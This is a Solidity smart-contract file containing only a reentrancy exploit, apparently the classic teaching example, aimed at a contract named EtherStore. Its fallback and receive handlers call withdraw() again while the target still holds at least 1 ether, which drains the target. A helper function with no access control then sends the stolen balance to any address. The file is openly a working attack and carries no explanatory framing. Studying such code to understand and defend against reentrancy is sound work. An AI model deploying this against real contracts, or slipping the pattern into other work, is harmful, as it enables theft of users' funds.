// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.2 <0.9.0;

import "./EtherStore.sol";

contract Attack {
    uint256 counter = 0;
    EtherStore public etherStore;
    event Logger(string message, uint256 counter);
    
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            counter +=  1;
            emit Logger("Fallback Attack !", counter);
            etherStore.withdraw();
        }
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            counter +=  1;
            emit Logger("Recieve Attack !", counter);
            etherStore.withdraw();
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "More than 1 ether needed");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function transferToaddress(address payable addressToSend) public payable {
        addressToSend.transfer(address(this).balance);
    }
}
